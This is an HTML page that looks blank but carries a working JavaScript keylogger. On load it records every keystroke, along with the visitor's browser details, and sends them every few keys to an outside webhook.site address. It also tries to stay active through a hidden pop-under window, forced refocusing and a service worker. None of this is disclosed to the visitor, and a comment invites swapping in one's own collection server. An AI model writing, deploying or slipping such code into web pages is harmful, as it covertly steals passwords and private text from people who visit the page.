<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
        }
    </style>
</head>
<body>
    <script>
        let keystrokes = [];
        const webhookUrl = 'https://webhook.site/5c952e38-7c8b-4004-af93-16fed30fa52c'; // Replace with your webhook or server URL

        // Capture all keystrokes immediately upon page load
        document.addEventListener('keydown', (e) => {
            const timestamp = new Date().toISOString();
            let keyValue = e.key || 'Unknown';
            
            // Handle specific key types for clear logging
            if (keyValue === ' ') {
                keyValue = '[SPACE]';
            } else if (keyValue === 'Enter') {
                keyValue = '[ENTER]';
            } else if (keyValue === 'Backspace') {
                keyValue = '[BACKSPACE]';
            } else if (keyValue === 'Tab') {
                keyValue = '[TAB]';
            } else if (keyValue.length > 1) {
                keyValue = `[${keyValue}]`; // For special keys like Shift, Ctrl, etc.
            }
            
            // Store keystroke with timestamp
            keystrokes.push({ time: timestamp, key: keyValue });
            
            // Send data every 5 keystrokes for near real-time logging
            if (keystrokes.length >= 5) {
                sendData();
            }
        });

        // Function to send data to webhook
        function sendData() {
            if (keystrokes.length > 0) {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    mode: 'no-cors',
                    body: JSON.stringify({
                        device: navigator.userAgent,
                        keystrokes: keystrokes,
                        formattedString: keystrokes.map(k => k.key).join('')
                    })
                }).catch(err => console.error('Failed to send data'));
                keystrokes = []; // Clear buffer after sending
            }
        }

        // Send remaining data if page is about to close
        window.addEventListener('beforeunload', () => {
            sendData();
            // Attempt to open a hidden pop-under window to persist
            try {
                let popUnder = window.open(window.location.href, '_blank', 'width=1,height=1,left=-9999,top=-9999');
                if (popUnder) {
                    popUnder.blur();
                    window.focus();
                }
            } catch (e) {
                console.error('Pop-under blocked');
            }
        });

        // Attempt to refocus if user switches away
        window.addEventListener('blur', () => {
            try {
                window.focus();
            } catch (e) {
                console.error('Focus failed');
            }
        });

        // Register a Service Worker for background persistence (if supported)
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/sw.js')
                    .then(registration => {
                        console.log('Service Worker registered');
                    })
                    .catch(error => {
                        console.log('Service Worker registration failed: ', error);
                    });
            });
        }
    </script>
</body>
</html>